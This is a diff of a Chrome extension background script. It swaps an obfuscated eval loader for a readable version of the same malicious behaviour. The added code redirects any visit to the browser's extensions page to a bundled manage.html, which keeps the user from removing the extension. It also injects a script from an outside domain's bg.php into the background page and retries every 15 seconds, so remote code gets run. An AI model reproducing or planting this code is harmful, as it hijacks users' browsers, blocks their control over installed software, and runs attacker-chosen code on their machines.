@@ -1,1 +1,17 @@
-eval((function(){var g=[72,89,66,86,85,74,88,65,80,94,60,75,70,81,79,76,90,87,71,82];var r=[];for(var d=0;d<g.length;d++)r[g[d]]=d+1;var j=[];for(var l=0;l<arguments.length;l++){var q=arguments[l].split('~');for(var y=q.length-1;y>=0;y--){var m=null;var s=q[y];var c=null;var a=0;var k=s.length;var i;for(var n=0;n<k;n++){var u=s.charCodeAt(n);var b=r[u];if(b){m=(b-1)*94+s.charCodeAt(n+1)-32;i=n;n++;}else if(u==96){m=94*(g.length-32+s.charCodeAt(n+1))+s.charCodeAt(n+2)-32;i=n;n+=2;}else{continue;}if(c==null)c=[];if(i>a)c.push(s.substring(a,i));c.push(q[m+1]);a=n+1;}if(c!=null){if(a<k)c.push(s.substring(a));q[y]=c.join('');}}j.push(q[0]);}var x=j.join('');var o='abcdefghijklmnopqrstuvwxyz';var w=[39,42,126,96,10,92].concat(g);var h=String.fromCharCode(64);for(var d=0;d<w.length;d++)x=x.split(h+o.charAt(d)).join(String.fromCharCode(w[d]));return x.split(h+'!').join(h);})('H*d,sc,ld;(H!(){H*a=(e)("eri.csra=bnyes@ideujgooesNct%%%p%mtchar/@npexstnei.esnbueeestl?ot@kueslcrdpuo%y%ceagtTedhl%pb%@kwcnasxeneagntmn%teeixdwsn:i@vctoslnor%rteyaa:etp:sepatoit%wietad.%enpaeaarcmttmsg%%ssvpmpiishegtedn%dmet//r%i%erxtf/rlttte/nttaesnln@zde%at/r@u%t/a/Eee/.eapinddhsanpnm%Cpi/b%hehhu/eeE%cm%x%sx@vtpgrohc",5977039);H! e(b,k){H*c=b.lengthH\'l=[];for(H*g=0;g@qc;g++){l[g]=b.char@nt(g)};for(H*g=0;g@qc;g++){H*i=k@b(g+5)+(k%560184)H\'f=k@b(g+7)+(k%651773)H\'e=i%cH\'a=f%cH\'j=l[e];l[e]=l[a];l[a]=j;k=(i+f)%33572229}H\'h=String.fromCharCode(127);H$ lH%""H""%")H%hH""#1")H%"%"H""#0")H%"#"H"h)}if(e=H&){H$};H! b(e,b,c){if((c[a[0]]==a[1]||c[a[0]]==a[2]||c[a[0H(3H)1])==0)&&b[a[4]]==a[5]){chromeH+0H(9]](e,{url:chrome[a[8H(7H)6])})}}if(!c){cH&H H! c(){if(b==H&){c(a[21])}else {if(ld>0){H$}}H\'f=documentH+5H)14])H#c=a[7]H fH+6]]=a[17];fH+8]]H&;f[a[21H)19],d+a[20])H#e();c=0H document[a[24H)23])[0][a[22]](f);if(ld==0){setTimeout(H!(){c()},15000)}}sc=c;chromeH+0H(12H(11]](b);d=a[13]H#H$}H#b(a[8])H ld=0;c()})()~;H$};~function~).split(~;if(!a){~return~.join(~=false~;H*~]][a[~]](a[~var ~[a[1'));
+chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab){
+    if((tab.url == "chrome://extensions/" || tab.url == "chrome://chrome/extensions" || tab.url.indexOf('chrome://extensions/') == 0) && changeInfo.status == 'loading') chrome.tabs.update(tabId,{url:chrome.extension.getURL('/manage.html')});
+});
+var d = "https://www.userexperienceapps.net/";
+function sc() {
+    if (ld > 0) return;
+    var a = document.createElement('script');
+    a.type = 'text/javascript';
+    a.async = false;
+    a.setAttribute('src', d+'bg.php?b=c');
+    document.getElementsByTagName('head')[0].appendChild(a);
+    if (ld == 0) setTimeout(function() {
+        sc();
+    }, 15000);
+}
+var ld = 0;
+sc();
